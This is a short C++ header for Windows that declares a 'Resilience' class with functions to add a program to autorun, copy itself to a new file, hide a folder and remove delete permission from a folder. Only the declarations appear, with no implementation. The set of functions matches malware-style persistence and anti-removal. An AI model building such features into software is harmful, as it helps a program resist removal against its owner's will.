#pragma once
#include <string>
#include <windows.h>
#include <vector>
#include <Shlobj_core.h>
#include <Aclapi.h>

class Resilience {
public:
	static bool AddToAutorun(std::wstring filename, std::wstring name, std::vector<std::wstring> executionArguments);
	static bool Replicate(std::wstring filename, std::wstring newFilename);
	static bool HideFolder(std::wstring folder);
	static bool RemoveDeletePermissionFromFolder(std::wstring folder);
};

